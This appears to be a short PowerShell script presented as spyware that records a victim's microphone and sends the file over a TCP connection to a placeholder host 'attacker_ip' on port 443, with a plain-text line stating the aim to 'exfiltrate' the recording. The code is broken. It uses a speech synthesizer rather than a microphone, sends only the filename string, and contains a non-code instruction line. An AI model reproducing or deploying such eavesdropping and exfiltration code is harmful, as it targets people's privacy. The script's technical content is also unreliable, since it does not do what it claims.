Add-Type -AssemblyName System.Speech
$audio = New-Object System.Speech.AudioFormat.SpeechAudioFormatInfo ([System.Speech.AudioFormat.AudioStreamFormat]::GetFormat(44100, 16, 2))
$rec = New-Object System.Speech.Synthesis.SpeechSynthesizer
$rec.SetOutputToWaveFile("C:\microphone_recording.wav")
Exfiltrate the microphone recording over a proxy

$ip = "attacker_ip"
$port = 443
$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
$writer.Write("microphone_recording.wav")
$writer.Flush()
$client.Close()
